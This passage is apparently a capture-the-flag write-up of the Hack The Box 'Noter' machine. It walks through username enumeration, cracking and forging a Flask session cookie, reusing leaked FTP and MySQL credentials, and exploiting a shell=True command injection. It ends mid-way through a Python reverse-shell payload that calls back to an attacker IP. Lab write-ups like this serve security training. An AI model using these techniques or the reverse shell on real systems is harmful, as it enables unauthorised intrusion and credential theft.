<p>When posting a new note, pressing the <code>?</code> icon we find the information <code>CKEditor 4.6.2 (revision 20af917)</code>. Googling around it seems to be vulnerable to XSS, although the post seems to be done with a CDN, so not local and should not be seen as a attack vector.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>script <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">src</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"//cdn.ckeditor.com/4.6.2/basic/ckeditor.js"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/script<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-2">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>script <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text/javascript"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-3">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CKEDITOR.replace</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'editor'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-4">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/script<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>After some enumeration I finally found that the login validates if the username is correct or not. Trying to login with an invalid user gives the error <code>Invalid credentials</code>, however trying a valid user and wrong password gives <code>Invalid login</code>.</p>
<p>With this information we send the login to Burp Intruder, add the two strings to “Grep - Match” and brute force the user using Burp built-in Usernames list.</p>
<p><img src="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter02.png" class="img-fluid"></p>
<p>Admin is my registered user, however <code>blue</code> is not - we found a valid user!</p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Next we need to find the credentials for user <code>blue</code>, we can try to brute force the login which would cause a lot of noice, but we can also try to to crack the JWT (as it’s HMAC).</p>
<p><img src="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter03.png" class="img-fluid"></p>
<p>Running <code>webanalyze</code> we find that Flask is running on the backend. Reading through HackTricks about Flask we find the tool <code>Flask-Unsign</code> which is used to fetch, decode, brute-force and craft session cookies of Flask applications - perfect!</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://10.10.11.160:5000</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://10.10.11.160:5000</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.1s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb4-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bootstrap,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UI</span> frameworks<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb4-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Flask,</span> 2.0.2 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> frameworks, Web servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb4-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Python,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb4-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Python,</span> 3.8.10 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter flask-unsign <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--decode</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--cookie</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZiJ9.YosnvA.92mU6dpP4-5opRXc6h2EhLq8hVI'</span></span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'logged_in'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> True, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'username'</span>: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'asdf'</span>}</span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter flask-unsign <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--wordlist</span> /usr/share/wordlists/rockyou.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--unsign</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--cookie</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZiJ9.YosnvA.92mU6dpP4-5opRXc6h2EhLq8hVI'</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--no-literal-eval</span></span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Session decodes to: {<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'logged_in'</span>: True, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'username'</span>: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'asdf'</span>}</span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Starting brute-forcer with 8 threads..</span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Found secret key after 17152 attempts</span>
<span id="cb5-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'secret123'</span></span>
<span id="cb5-9"></span>
<span id="cb5-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter flask-unsign <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--sign</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--cookie</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{'logged_in': True, 'username': 'blue'}"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--secret</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'secret123'</span>                                                   </span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yos0Lw.Lp1b4zGs-GrDuPvgxv2kkkC3qzE</span></span></code></pre></div>
<p>Change the browser session cookie and refresh the page, and boom we are <code>blue</code>! <strong>Note</strong>: As a VIP user we can Import and Export notes.</p>
<p><img src="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter04.png" class="img-fluid"></p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Blue have two notes and in one of them we find the clear text credentials to the FTP - <code>blue:blue@Noter!</code> But we also find the username <code>ftp_admin</code>. <img src="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter05.png" class="img-fluid"></p>
<p>Login to the FTP using found credentials. Within we find the file <code>policy.pdf</code>, download the file and review it.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter ftp 10.10.11.160</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connected</span> to 10.10.11.160.</span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">220</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vsFTPd</span> 3.0.3<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Name</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.160:void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> blue </span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">331</span> Please specify the password.</span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span></span>
<span id="cb6-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">230</span> Login successful.</span>
<span id="cb6-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Remote</span> system type is UNIX.</span>
<span id="cb6-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Using</span> binary mode to transfer files.</span>
<span id="cb6-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ls</span>
<span id="cb6-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> PORT command successful. Consider using PASV.</span>
<span id="cb6-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> Here comes the directory listing.</span>
<span id="cb6-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>    2 1002     1002         4096 May 02 23:05 files</span>
<span id="cb6-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>    1 1002     1002        12569 Dec 24 20:59 policy.pdf</span>
<span id="cb6-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">226</span> Directory send OK.</span>
<span id="cb6-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> mget <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb6-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mget</span> policy.pdf<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span> y</span>
<span id="cb6-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> PORT command successful. Consider using PASV.</span>
<span id="cb6-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> Opening BINARY mode data connection for policy.pdf <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">12569</span> bytes<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb6-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">226</span> Transfer complete.</span>
<span id="cb6-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">12569</span> bytes received in 0.00 secs <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9.2992</span> MB/s<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>The pdf is a password policy, and within we find the line; <em>“Default user-password generated by the application is in the format of”username@site_name!” (This applies to all your applications)“</em></p>
<p>We can try if this applies to <code>ftp_admin:ftp_admin@Noter!</code> as well.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter ftp 10.10.11.160                                                                           </span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connected</span> to 10.10.11.160.</span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">220</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vsFTPd</span> 3.0.3<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Name</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.160:void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> ftp_admin</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">331</span> Please specify the password.</span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span></span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">230</span> Login successful.</span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Remote</span> system type is UNIX.</span>
<span id="cb7-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Using</span> binary mode to transfer files.</span>
<span id="cb7-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ls</span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> PORT command successful. Consider using PASV.</span>
<span id="cb7-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> Here comes the directory listing.</span>
<span id="cb7-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip</span>
<span id="cb7-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip</span>
<span id="cb7-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">226</span> Directory send OK.</span>
<span id="cb7-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> mget <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb7-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mget</span> app_backup_1635803546.zip<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span> y</span>
<span id="cb7-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> PORT command successful. Consider using PASV.</span>
<span id="cb7-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> Opening BINARY mode data connection for app_backup_1635803546.zip <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">25559</span> bytes<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb7-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">226</span> Transfer complete.</span>
<span id="cb7-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">25559</span> bytes received in 0.03 secs <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">783.7460</span> kB/s<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mget</span> app_backup_1638395546.zip<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span> y</span>
<span id="cb7-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> PORT command successful. Consider using PASV.</span>
<span id="cb7-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> Opening BINARY mode data connection for app_backup_1638395546.zip <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">26298</span> bytes<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb7-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">226</span> Transfer complete.</span>
<span id="cb7-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">26298</span> bytes received in 0.03 secs <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">811.6058</span> kB/s<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Review the backup files <strong><code>app_backup_1638395546</code></strong> and we find.. .. <strong>MySQL Config - <code>app.py</code></strong></p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_HOST'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span></span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_USER'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DB_user'</span></span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_PASSWORD'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DB_password'</span></span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_DB'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'app'</span></span></code></pre></div>
<p>Review the older backup, <strong><code>app_backup_1635803546</code></strong>, and we find.. .. <strong>MySQL Config - <code>app.py</code></strong></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_HOST'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span></span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_USER'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'root'</span></span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_PASSWORD'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Nildogg36'</span></span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app.config[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MYSQL_DB'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'app'</span></span></code></pre></div>
<p>Looking on the import and export functions we find and dangerous subprocess with <code>shell=True</code>, we can most likely exploit this function to get a reverse shell.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Export remote</span></span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">@app.route</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/export_note_remote'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> methods=<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'POST'</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">@is_logged_in</span></span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">def</span> export_note_remote<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-5">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">check_VIP</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">session</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'username'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-6">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">try:</span></span>
<span id="cb10-7">            <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">url</span> = request.form<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'url'</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span></span>
<span id="cb10-8"></span>
<span id="cb10-9">            <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">status,</span> error = parse_url<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-10"></span>
<span id="cb10-11">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">status</span> is True<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">and</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">error</span> is None<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-12">                <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">try:</span></span>
<span id="cb10-13">                    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">r</span> = pyrequest.get<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">url,allow_redirects=True</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-14">                    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rand_int</span> = random.randint<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1,10000</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-15">                    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">command</span> = f<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"</span></span>
<span id="cb10-16">                    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">subprocess.run</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">command</span>, shell=True, executable=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/bin/bash"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>Create a python3 revshell in a markdown file, and break the command synax as seen above, to execute our malicious revshell.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter cat rev.md </span>
<span id="cb11-2"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">';python3 -c '</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">import</span> socket,subprocess,os<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">s</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>socket.socket<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">socket.AF_INET,socket.SOCK_STREAM</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s.connect</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">((</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"10.10.14.26"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">,</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">));</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">os.dup2</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">s.fileno()</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">os.dup2</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">s.fileno()</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">os.dup2</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">s.fileno()</span><span class="ex" style="color: null;
background-color: null;
